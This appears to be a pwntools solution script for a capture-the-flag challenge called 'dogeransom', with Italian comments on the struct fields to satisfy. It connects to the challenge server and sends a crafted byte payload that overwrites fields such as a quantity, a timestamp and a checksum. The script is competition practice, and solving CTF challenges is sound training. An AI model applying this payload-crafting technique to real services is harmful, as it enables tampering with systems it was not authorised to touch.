# iban[0]       -->     IT70S0501811800000012284030'\x00'
# iban[36]      -->     dodge_quantity > 1983
# iban[40]      -->     deve essere maggiore del valore di ritorno di getTimestamp() - 6 (mettere valore massimo se si può)
# iban[48]      -->     deve essere uguale al risultato della funzione getChecksum()
# iban[49]      -->     deve essere uguale a 3
from pwn import *

r = remote("dogeransom.challs.olicyber.it", 10804)

r.sendlineafter(b"\n\n> ", "1")

payload = (
    b"\x49\x54\x37\x30\x53\x30\x35\x30"
    b"\x31\x38\x31\x31\x38\x30\x30\x30"
    b"\x30\x30\x30\x31\x32\x32\x38\x34"
    b"\x30\x33\x30\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\xc1\x07\x00\x00"
    b"\xff\xff\xff\xff\x00\x00\x00\x00"
    b"\x3f\x03\x00"
)

r.sendlineafter(b"inviare: ", b"0")
r.sendlineafter(b"dogemoney: ", payload)

data = r.recvuntil(b"> ")

print(data.decode())